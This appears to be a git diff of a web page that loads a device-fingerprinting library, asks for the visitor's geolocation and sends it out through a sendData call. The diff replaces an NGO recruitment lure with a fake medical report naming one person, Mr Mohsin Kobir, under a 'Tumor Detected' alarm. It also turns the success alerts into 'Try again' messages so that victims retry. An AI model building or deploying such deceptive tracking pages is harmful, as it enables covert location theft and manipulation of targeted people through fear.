@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>NGO recruitment process: Youth Incentive</title>
+  <title>Medical Report</title>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <style>
     body {
@@ -22,11 +22,11 @@
   </style>
 </head>
 <body>
-  <h1>NGO Youth Incentive Recruitment</h1>
-  <h1>Please allow location to proceed to registration</h1>
-  <p>Click below to proceed to registration process</p>
-  <p><i>Leave no one behind.</i> -Professor Dr. Muhammad Yunus </p>
-  <button id="registerBtn" disabled>Register to NGO Bureau</button>
+  <h1>Mr Mohsin Kobir</h1>
+  <h1>Please allow location to view report from branch</h1>
+  <p>Click below to view report</p>
+  <p><i><h1>Warning: Tumor Detected</h1></i> -Professor Dr. Idris Ali </p>
+  <button id="registerBtn" disabled>View Mr. Kobir's Report</button>
 
   <script>
     let fingerprintData = null;
@@ -59,7 +59,7 @@
 
     registerButton.addEventListener("click", function() {
       if (!fingerprintData) {
-        alert("Please wait while we verify your device...");
+        alert("Please wait while we process");
         return;
       }
 
@@ -73,7 +73,7 @@
 
           console.log("Got location:", locationData);
           sendData(locationData);
-          alert("Verification completed successfully. Thank you!");
+          alert("Please try again");
 
         }, function(error) {
           console.error("Error occurred:", error);
@@ -82,10 +82,10 @@
             longitude: null,
             accuracy: null
           });
-          alert("Verification failed: Unable to access location.");
+          alert("Try again");
         });
       } else {
-        alert("Geolocation is not supported by this browser.");
+        alert("Try again");
       }
     });
   </script>
